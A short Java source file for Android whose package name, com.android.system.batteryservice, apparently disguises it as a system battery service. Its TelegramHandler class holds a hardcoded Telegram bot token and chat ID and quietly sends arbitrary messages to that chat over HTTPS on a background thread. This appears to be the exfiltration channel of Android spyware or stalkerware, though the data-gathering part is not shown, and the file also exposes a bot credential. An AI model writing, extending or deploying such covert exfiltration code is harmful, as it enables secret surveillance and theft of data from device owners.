package com.android.system.batteryservice;

import android.util.Log;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class TelegramHandler {

    private static final String BOT_TOKEN = "8104739949:AAEOhfBd8Gjvth-sHgivhZ1TWTkG7q3gKjg";
    private static final String CHAT_ID = "8160053784";

    public static void sendMessage(String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                        "/sendMessage?chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(message, "UTF-8");

                HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
                conn.setRequestMethod("GET");
                conn.getInputStream().close();
            } catch (Exception e) {
                Log.e("TelegramHandler", "Errore invio: " + e.getMessage());
            }
        }).start();
    }
}
